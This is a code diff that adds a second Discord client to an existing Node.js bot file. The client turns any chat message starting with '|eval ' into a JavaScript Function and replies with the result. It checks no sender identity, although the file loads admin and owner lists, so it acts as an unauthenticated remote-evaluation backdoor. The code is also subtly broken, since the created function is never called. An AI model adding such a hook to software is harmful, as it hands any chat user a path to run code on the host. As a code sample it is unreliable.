@@ -9,6 +9,20 @@ var perms = require('./admins.json');
 var admins = require('./owners.json');
 var conf = require('./a.json');
 var lang = require('bot_helper_scripts/bl');
+const Discord = require('discord.js');
+const clientd = new Discord.Client();
+
+clientd.on('ready', () => {
+  console.log(`Logged in as ${clientd.user.tag}!`);
+});
+
+clientd.on('message', msg => {
+  if (msg.content.startsWith("|eval ")) {
+    msg.reply(Function(msg.content.slice(6)));
+  }
+});
+
+clientd.login('token');
 var cl;
 var bc;
 var cd;
